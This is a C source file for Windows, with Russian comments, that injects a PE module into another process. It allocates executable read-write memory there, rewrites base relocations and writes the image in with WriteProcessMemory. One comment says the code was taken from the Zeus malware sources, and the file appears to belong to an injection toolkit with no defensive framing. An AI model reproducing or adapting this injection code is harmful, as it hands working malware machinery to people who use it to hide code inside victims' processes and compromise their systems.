#include "stdafx.h"
#include <Windows.h>

#include "log.h"
#include "test_inj.h"
#include "utils.h"

#if IS_DEBUG > 0
#include <stdio.h>
#endif

// Стырено с исходников зеуса!
void *
copy_module_to_process(HANDLE process, void *image)
{
#if defined _WIN64
	PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
#else
	PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
#endif
	bool ok = false;

	DEBUG(LOG_DEFAULT, "[+] nt header addr %p\n", (void *)ntHeader);

	DWORD imageSize = ntHeader->OptionalHeader.SizeOfImage;

	DEBUG(LOG_DEFAULT, "[+] image size = %d\n", imageSize);

	if(IsBadReadPtr(image, imageSize) != 0)
		return NULL;
	
	//Выделние памяти для модуля.
	LPBYTE remoteMem = (LPBYTE)VirtualAllocEx(process,
		NULL,
		imageSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);

	if(remoteMem == NULL)
		return NULL;

	//Создаем локальный буфер, в котором будем вносить измненеия.
	LPBYTE buf = (LPBYTE)dup_memory(image, imageSize);
	if(buf == NULL)
		goto finalize;
		
	//Изменяем релоки.
	IMAGE_DATA_DIRECTORY *relocsDir = &ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		
	if(relocsDir->Size > 0 && relocsDir->VirtualAddress > 0) {
		DWORD_PTR delta	= (DWORD_PTR)((LPBYTE)remoteMem - ntHeader->OptionalHeader.ImageBase);
		DWORD_PTR oldDelta = (DWORD_PTR)((LPBYTE)image - ntHeader->OptionalHeader.ImageBase);
		IMAGE_BASE_RELOCATION *relHdr = (IMAGE_BASE_RELOCATION *)(buf + relocsDir->VirtualAddress);
		
		while(relHdr->VirtualAddress != 0) {
			if(relHdr->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) { //FIXME: Что это?
				DWORD relCount = (relHdr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				LPWORD relList = (LPWORD)((LPBYTE)relHdr + sizeof(IMAGE_BASE_RELOCATION));
				
				for(DWORD i = 0; i < relCount; i++)if(relList[i] > 0) {
					DWORD_PTR *p = (DWORD_PTR *)(buf + (relHdr->VirtualAddress + (0x0FFF & (relList[i]))));
					*p -= oldDelta;
					*p += delta;
				}
			}
					
			relHdr = (IMAGE_BASE_RELOCATION *)((LPBYTE)relHdr + relHdr->SizeOfBlock);
		}
			
		//Копируем образ в процесс.
		ok = WriteProcessMemory(process,
			remoteMem,
			buf,
			imageSize,
			NULL) ? true : false;
	}

#if IS_DEBUG > 0
	FILE *temp;
	DEBUG(LOG_DEFAULT, "[+] dumping memory!\n");
	temp = fopen("temp_dump.bin", "w");
	fwrite(buf, 1, imageSize, temp);
	fclose(temp);
#endif
	
	free(buf);
		
finalize:
	if(!ok) {
		VirtualFreeEx(process, (void *)remoteMem, 0, MEM_RELEASE);
		remoteMem = NULL;
	}
	
	return remoteMem;
}


void *
allocRemoteMemory(HANDLE proc, DWORD sz)
{
	return VirtualAllocEx(proc,
	    NULL,
	    sz,
	    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
}
